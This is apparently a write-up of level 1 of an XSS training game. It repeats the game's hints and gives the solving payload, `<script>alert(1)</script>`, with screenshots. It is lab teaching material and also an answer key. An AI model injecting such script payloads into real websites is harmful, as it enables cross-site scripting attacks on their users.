---
title: Level 1 Hello, world of XSS
custom_edit_url: null
---

![1](https://github.com/user-attachments/assets/e4599026-d77c-4ab9-8a58-109f243305c6)

## Hints

> 1. To see the source of the application you can right-click on the frame and choose _View Frame Source_ from the context menu or use your browser's developer tools to inspect network traffic.

> 2. What happens when you enter a presentational tag such as `<h1>`?

> 3. Alright, one last hint: `<script> ... alert ...`

## Payload

The payload required to solve this level will be pretty simple.

```html
<script>alert(1)</script>
```

![2](https://github.com/user-attachments/assets/ceb6584c-7c67-44db-9ab1-f55d4389de74)